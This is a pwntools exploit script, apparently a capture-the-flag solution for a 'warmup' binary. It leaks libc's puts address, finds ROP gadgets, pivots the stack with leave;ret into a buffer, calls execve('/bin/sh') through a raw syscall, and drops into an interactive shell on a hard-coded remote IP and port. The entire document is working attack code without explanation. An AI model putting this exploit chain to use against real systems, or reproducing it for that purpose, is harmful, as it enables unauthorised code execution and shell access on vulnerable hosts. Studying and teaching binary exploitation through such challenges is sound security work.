#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './warmup_patched'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '172.210.129.230', 1338

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x0401280
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec warmup 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

LEAVE_RET = 0x0401280
RET = 0x0401281

def exploit():
    global io
    io = initialize()

    puts = int(io.recvline()[2:].strip(), 16)
    libc.address = puts - libc.sym['puts']

    rop = ROP(libc)
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    info('POP RDI: %#x', POP_RDI)
    POP_RSI = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
    info('POP RSI: %#x', POP_RSI)
    # POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
    POP_RDX = 0x0000000000066b9a + libc.address
    info('POP RDX: %#x', POP_RDX)
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    info('POP RAX: %#x', POP_RAX)
    SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
    info('SYSCALL: %#x', SYSCALL)

    payload = flat([
            POP_RDI,
            next(libc.search(b'/bin/sh\x00')),
            POP_RSI,
            0x0,
            0x0,
            POP_RDX,
            0x0,
            POP_RAX,
            0x3b,
            SYSCALL
    ])

    p = flat({0x198 - len(payload): payload})
    assert(len(p) <= 0x200)
    io.sendlineafter(b'>>', p)

    payload = flat({
        64: [
            elf.sym['name'] + 0x198 - 0x8 - len(payload),
            LEAVE_RET,
        ]
    })
    io.sendlineafter(b'>>', payload)

    log.success('puts: %#x', puts)
    log.success('libc base: %#x', libc.address)
    log.info('payload length: %d', len(payload))
    io.interactive()
    
if __name__ == '__main__':
    exploit()